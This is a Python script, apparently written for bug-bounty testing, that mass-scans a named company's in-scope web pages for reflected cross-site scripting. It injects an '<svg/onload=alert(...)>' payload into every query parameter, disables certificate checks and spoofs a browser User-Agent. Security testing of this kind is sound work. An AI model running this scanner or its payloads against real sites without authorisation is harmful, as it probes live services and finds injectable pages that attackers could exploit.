#!/usr/bin/env python3
"""ind_reflect.py -- reflected-XSS scan for Indeed's in-scope hosts.

Same disciplines as the DigiCert pass:
  * token contiguous under escaping (raw form built FROM the token)
  * baseline fetched first; a token that appears with no param is a trap
  * RAW (unescaped payload) / ENC (escaped) / HEADER / DROP, never pooled
  * classifier self-test on fixtures before any zero is believed
"""
import concurrent.futures as cf
import json
import random
import re
import string
import sys
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit

import requests
import urllib3

urllib3.disable_warnings()
UA = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/126.0 Safari/537.36",
      "Accept": "text/html,application/xhtml+xml,application/json;q=0.9,*/*;q=0.8"}
T = 12
CANARY = "40931"


def tok():
    return "zq" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))


def mk(t):
    return f"{t}<svg/onload=alert({CANARY})>"


def fetch(url):
    try:
        r = requests.get(url, timeout=T, verify=False, headers=UA,
                         allow_redirects=True)
        return r
    except Exception:
        return None


ESC = re.compile(r"&lt;\s*svg|%3Csvg|&#60;|&#x3c;", re.I)


def classify(body, hdrs, t):
    if t not in body:
        h = " ".join(str(v) for v in hdrs.values())
        return "HEADER" if t in h else "DROP"
    if f"<svg/onload=alert({CANARY})" in body:
        return "RAW"
    if ESC.search(body):
        return "ENC"
    return "TOKEN_NOPARSE"


def probe(url):
    p = urlsplit(url)
    q = parse_qsl(p.query, keep_blank_values=True)
    if not q:
        return None
    t = tok()
    payload = mk(t)
    # control: same URL, params with a benign value
    cq = [(k, "zqctl") for k, _ in q]
    ctl = fetch(urlunsplit((p.scheme, p.netloc, p.path, urlencode(cq), "")))
    if ctl is None:
        return None
    cbody = ctl.text or ""
    if t in cbody:
        return {"url": url, "verdict": "FP_BASELINE"}
    pq = [(k, payload) for k, _ in q]
    r = fetch(urlunsplit((p.scheme, p.netloc, p.path, urlencode(pq), "")))
    if r is None:
        return None
    v = classify(r.text or "", dict(r.headers), t)
    out = {"url": url, "verdict": v, "status": r.status_code,
           "params": [k for k, _ in q],
           "probe": urlunsplit((p.scheme, p.netloc, p.path, urlencode(pq), ""))}
    if v in ("RAW", "ENC", "TOKEN_NOPARSE"):
        body = r.text or ""
        i = body.find(t)
        if i >= 0:
            out["ctx"] = body[max(0, i - 100):i + 120].replace("\n", " ")[:240]
    return out


def selftest():
    raw = '<p>zqTOK<svg/onload=alert(40931)></p>'
    enc = '<p>zqTOK&lt;svg/onload=alert(40931)&gt;</p>'
    assert classify(raw, {}, "TOK") == "RAW"
    assert classify(enc, {}, "TOK") == "ENC"
    assert classify("nothing", {"Location": "x?q=TOK"}, "TOK") == "HEADER"
    assert classify("nothing", {}, "TOK") == "DROP"
    print("[selftest] RAW/ENC/HEADER/DROP all discriminate correctly")


def main():
    selftest()
    targets = json.load(open("/opt/watch/logs/indeed/reflect_targets.json"))
    print(f"[*] {len(targets)} unique in-scope host+path targets", flush=True)
    res = []
    with cf.ThreadPoolExecutor(max_workers=25) as ex:
        for i, r in enumerate(ex.map(probe, targets), 1):
            if not r:
                continue
            res.append(r)
            if r["verdict"] != "DROP":
                print(f"[{r['verdict']}] {r.get('status')} {r['url'][:105]}",
                      flush=True)
            if i % 1000 == 0:
                print(f"  [{i}/{len(targets)}] non-drop={len(res)}", flush=True)
    json.dump(res, open("/opt/watch/logs/indeed/reflections.json", "w"), indent=1)
    from collections import Counter
    print("\nverdicts:", dict(Counter(x["verdict"] for x in res)))
    raws = [x for x in res if x["verdict"] == "RAW"]
    print(f"\nRAW: {len(raws)}")
    for x in raws[:40]:
        print("  ", x["url"])
        print("     ", x.get("ctx", "")[:200])


if __name__ == "__main__":
    main()
